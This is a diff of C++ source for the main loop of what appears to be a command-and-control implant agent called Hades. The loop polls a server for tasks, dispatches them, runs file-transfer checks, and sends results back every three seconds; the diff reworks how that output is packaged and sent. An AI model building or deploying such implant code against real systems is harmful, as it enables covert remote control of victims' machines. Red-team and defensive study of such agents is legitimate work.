@@ -14,23 +14,30 @@ BOOL RunHades() {
 	PBYTE buf = AllocMemory<BYTE>(BASE_BUFFER_SIZE);
 	UINT capacity = BASE_BUFFER_SIZE;
 	UINT finalSize = 0;
-	while (TRUE) {
-		g_ByteMgr->InitWrite();
-		if (!g_Network->GetTask(&buf, BASE_BUFFER_SIZE, &finalSize, &capacity)) {
-			DEBUG_LOG("Failed!");
-			
-		}
-		DEBUG_LOG("Capacity = %d\nFinal Size = %d\n", capacity, finalSize);
+    while (TRUE) {
+        g_ByteMgr->InitWrite();
+        g_ByteMgr->Write4(MSG_TYPE_OUTPUT);
 
-		if(finalSize > 0) { 
-			g_Commander->Dispatch(buf, finalSize, g_ByteMgr->OutData); 
-			g_Network->SendOutput(g_ByteMgr->OutData, g_ByteMgr->WriteIndex);
-			DEBUG_LOG("Write Index: %u\n", g_ByteMgr->WriteIndex);
-		}
-		
+        if (!g_Network->GetTask(&buf, BASE_BUFFER_SIZE, &finalSize, &capacity)) {
+            DEBUG_LOG("Failed!");
+        }
 
-		Sleep(3000);
-	}
+        DEBUG_LOG("Capacity = %d\nFinal Size = %d\n", capacity, finalSize);
+
+        if (finalSize > 0) {
+            g_Commander->Dispatch(buf, finalSize, g_ByteMgr->OutData);
+        }
+
+        g_FileMgr->CheckTasks();
+
+        if (g_ByteMgr->WriteIndex > 4) {
+            g_Network->SendOutput(g_ByteMgr->OutData, g_ByteMgr->WriteIndex);
+            DEBUG_LOG("Write Index: %u\n", g_ByteMgr->WriteIndex);
+        }
+
+        Sleep(3000);
+    }
+
 }
 
 
